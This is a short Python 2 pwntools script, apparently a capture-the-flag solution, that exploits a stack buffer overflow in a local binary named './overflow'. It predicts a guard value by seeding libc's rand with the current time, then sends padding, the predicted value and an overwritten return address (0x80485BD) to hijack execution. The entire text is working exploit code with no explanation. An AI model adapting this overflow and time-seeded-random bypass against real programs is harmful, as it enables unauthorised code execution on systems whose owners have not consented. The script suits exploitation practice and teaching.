#/usr/bin/env python
from pwn import *
from ctypes import *

libc = cdll.LoadLibrary("libc.so.6")

p = process('./overflow')

ret = 0x80485BD
t = libc.time(0)
libc.srand(t)
random = libc.rand()

p.recvline()

payload = 'a'*0x20 + p32(random) + 'a'*0xc + p32(ret)
#gdb.attach(p)
p.sendline(payload)

print p.recvline()